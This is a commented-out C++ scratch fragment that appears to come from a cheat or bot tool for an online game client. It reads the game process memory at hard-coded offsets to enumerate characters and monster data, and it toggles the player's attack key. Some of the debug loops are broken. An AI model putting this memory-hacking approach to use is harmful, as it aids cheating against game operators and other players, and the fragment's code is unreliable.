///*ui.plainTextEditTest->appendHtml(to_string((Globals::iCPythonCharacterManagerInstance )).c_str());
//
//DWORD tg = (Globals::iCPythonCharacterManagerInstance + 32);
//TCharacterInstanceMap::iterator itor = *reinterpret_cast<TCharacterInstanceMap::iterator *>(tg);
//TCharacterInstanceMap::iterator itorEnd = *reinterpret_cast<TCharacterInstanceMap::iterator *>(tg +6);*/
//
//Globals::m_kAliveInstMap = *(TCharacterInstanceMap*)(*reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(Globals::iCPythonCharacterManagerInstance + 14)));
//
//int t = 0;
//
//for (; itor != itor; ++itor) {
//
//	t++;
//}
//
//
//ui.plainTextEditTest->appendHtml(to_string((t)).c_str());


//GameFunctions::PlayerSetAttackKeyState(true);


//typedef std::map<DWORD, TMobTable *> TNonPlayerDataMap;
//
//DWORD iNonPlayerInstance = *reinterpret_cast<DWORD *>(Globals::hEntryBaseAddress + 0x2BC84C); /*2BC860*/
//TNonPlayerDataMap	m_NonPlayerDataMap = *(TNonPlayerDataMap*)(*reinterpret_cast<DWORD *>(*reinterpret_cast<DWORD *>(iNonPlayerInstance + 4) + 4));
//for (TNonPlayerDataMap::iterator itor = m_NonPlayerDataMap.begin(); itor != m_NonPlayerDataMap.end(); itor++)
//{
//	DWORD y = itor->first;
//	const char* u = itor->second->szName;
//	int k = 0;
//}